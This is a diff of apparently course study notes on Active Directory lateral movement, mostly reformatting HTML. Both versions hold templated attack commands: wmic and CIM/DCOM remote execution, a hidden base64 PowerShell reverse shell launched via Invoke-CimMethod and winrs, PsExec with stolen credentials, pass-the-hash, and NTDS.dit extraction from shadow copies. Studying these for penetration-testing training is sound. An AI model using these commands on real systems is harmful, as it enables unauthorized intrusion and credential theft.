@@ -6,30 +6,36 @@
 <li>Uses Remote Procedure Calls (RPC) over 135 for remote access</li>
 <li>Abusing <code>wmic</code> (recently deprecated, but still probably good) on DMZ<ul>
 <li><code>wmic /node:{target_IP} /user:{domain_user} /password:{password} process call create &quot;{process}&quot;</code></li>
-<li>To use with powershell, we need to turn the password into a secure string and pass a reverse shell:
-```
-$username = &#39;{domain_user}&#39;;
-$password = &#39;{password}&#39;;
-$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
-$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;</li>
+<li>To use with powershell, we need to turn the password into a secure string and pass a reverse shell:</li>
 </ul>
 </li>
 </ul>
-<p>$Options = New-CimSessionOption -Protocol DCOM
-$Session = New-Cimsession -ComputerName {target_IP} -Credential $credential -SessionOption $Options</p>
-<p>$Command = &#39;powershell -nop -w hidden -e {reverse_shell_powershell_b64}&#39;;</p>
-<p>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};</p>
-<pre><code>**WinRM**
--<span class="ruby"> Communicates over <span class="hljs-number">5986</span> <span class="hljs-keyword">and</span> <span class="hljs-number">5985</span> with XML via HTTP/HTTPS
-</span>-<span class="ruby"> Use with <span class="hljs-string">`winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "cmd /c {command}"`</span> <span class="hljs-keyword">or</span> <span class="hljs-string">`winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "powershell -nop -w hidden -e {reverse_shell_powershell_base64}"`</span>
-</span>-<span class="ruby"> Can also be done via powershell</span>
-</code></pre><p>$username = &#39;{domain_user}&#39;;
+<pre><code>$username = &#39;{domain_user}&#39;;
 $password = &#39;{password}&#39;;
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
-$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;</p>
-<p>New-PSSession -ComputerName {target} -Credential $credential
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+$Options = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName {target_IP} -Credential $credential -SessionOption $Options
+
+$Command = &#39;powershell -nop -w hidden -e {reverse_shell_powershell_b64}&#39;;
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+</code></pre>
+<p><strong>WinRM</strong></p>
+<ul>
+<li>Communicates over 5986 and 5985 with XML via HTTP/HTTPS</li>
+<li>Use with <code>winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} &quot;cmd /c {command}&quot;</code> or <code>winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} &quot;powershell -nop -w hidden -e {reverse_shell_powershell_base64}&quot;</code></li>
+<li>Can also be done via powershell</li>
+</ul>
+<pre><code>$username = &#39;{domain_user}&#39;;
+$password = &#39;{password}&#39;;
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+New-PSSession -ComputerName {target} -Credential $credential
 Enter-PSSession {PSSession_ID_returned}
-```</p>
+</code></pre>
 <h3 id="psexec">PsExec</h3>
 <ul>
 <li>Tool used to replace telnet-like applications and provide remote execution of processes</li>
@@ -42,7 +48,7 @@ Enter-PSSession {PSSession_ID_returned}
 </li>
 <li><code>./PsExec64.exe -i  \\{dnshostname} -u {domain}\{domain_user} -p {password} cmd</code></li>
 </ul>
-<h3 id="pass-the-hash-repeat-from-module-16-">Pass the Hash (repeat from Module 16)</h3>
+<h3 id="pass-the-hash-repeat-from-module-16">Pass the Hash (repeat from Module 16)</h3>
 <ul>
 <li>Only works for NTLM hashes (discussed in 16 - Password Attacks)</li>
 <li>PsExec, Passing-the-hash toolkit, and Impacket can all pass hashes</li>
@@ -131,12 +137,14 @@ Enter-PSSession {PSSession_ID_returned}
 </li>
 <li>This will essentially give the domain user Domain Admin privileges<ul>
 <li><code>PsExec.exe \\{domain_controller_dnshostname} powershell</code><ul>
-<li>Can&#39;t use the IP of the DC, as that will resort to NTLM
-<strong>Shadow Copies</strong></li>
+<li>Can&#39;t use the IP of the DC, as that will resort to NTLM</li>
 </ul>
 </li>
 </ul>
 </li>
+</ul>
+<p><strong>Shadow Copies</strong></p>
+<ul>
 <li>Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots</li>
 <li>As a domain admin, we can create a shadow copy and extract the NTDS.dit database file</li>
 <li>Installed from <a href="https://www.microsoft.com/en-us/download/details.aspx?id=23490">here</a></li>
